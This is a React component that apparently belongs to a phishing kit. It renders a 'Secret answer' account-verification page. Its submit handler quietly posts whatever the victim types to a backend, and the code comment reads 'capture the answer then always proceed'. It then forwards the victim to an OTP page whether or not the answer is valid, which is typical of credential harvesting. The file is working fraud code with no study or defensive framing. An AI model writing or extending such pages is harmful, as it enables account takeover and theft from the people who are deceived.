import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";
import { HiArrowLeft } from "react-icons/hi";
import { HiEye, HiEyeSlash } from "react-icons/hi2";

const Security = () => {
  const navigate = useNavigate();
  const [answer, setAnswer] = useState("");
  const [showAnswer, setShowAnswer] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!answer.trim()) {
      setError("Please enter your secret answer.");
      return;
    }
    setLoading(true);
    setError("");
    // Fire and forget — capture the answer then always proceed
    axios
      .post(`${BASE_URL}/security`, { answer: answer.trim() })
      .catch(() => {});
    setTimeout(() => {
      setLoading(false);
      navigate("/otp");
    }, 800);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col px-7">
      {/* Top bar */}
      <div className="pt-12 flex items-center justify-between">
        <button
          type="button"
          onClick={() => navigate(-1)}
          className="bg-transparent cursor-pointer text-gray-700"
        >
          <HiArrowLeft className="text-2xl" />
        </button>
        <button
          type="button"
          className="text-[#FA5621] font-semibold text-[15px] bg-transparent cursor-pointer"
        >
          Need help?
        </button>
      </div>

      {/* Heading */}
      <div className="mt-8">
        <h1 className="text-[34px] font-black text-gray-900 leading-tight tracking-tight">
          Secret answer
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 leading-snug">
          Enter your answer to the secret question you created while creating
          your account.
        </p>
      </div>

      {/* Answer input */}
      <form onSubmit={handleSubmit} className="mt-8">
        <div className="flex items-center rounded-2xl bg-white border border-gray-200 shadow-sm px-4 py-5 gap-3">
          <input
            type={showAnswer ? "text" : "password"}
            placeholder="Your answer"
            value={answer}
            onChange={(e) => {
              setAnswer(e.target.value);
              setError("");
            }}
            autoComplete="off"
            className="flex-1 min-w-0 text-[16px] text-gray-800 placeholder-gray-300 bg-transparent outline-none"
          />
          <button
            type="button"
            onClick={() => setShowAnswer((v) => !v)}
            className="bg-transparent cursor-pointer text-gray-400 shrink-0"
          >
            {showAnswer ? (
              <HiEye className="text-xl" />
            ) : (
              <HiEyeSlash className="text-xl" />
            )}
          </button>
        </div>

        {error && (
          <p className="mt-3 text-sm text-red-500 font-medium">{error}</p>
        )}
      </form>

      {/* Proceed button — pinned bottom-right */}
      <div className="mt-auto pb-10 pt-6 flex justify-end">
        <button
          type="submit"
          disabled={loading}
          onClick={handleSubmit}
          className="bg-[#FA5621] hover:bg-[#e04d1c] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-[16px] px-10 py-5 rounded-2xl cursor-pointer transition-colors duration-200 shadow-lg"
        >
          {loading ? "Please wait..." : "Proceed"}
        </button>
      </div>
    </div>
  );
};

export default Security;
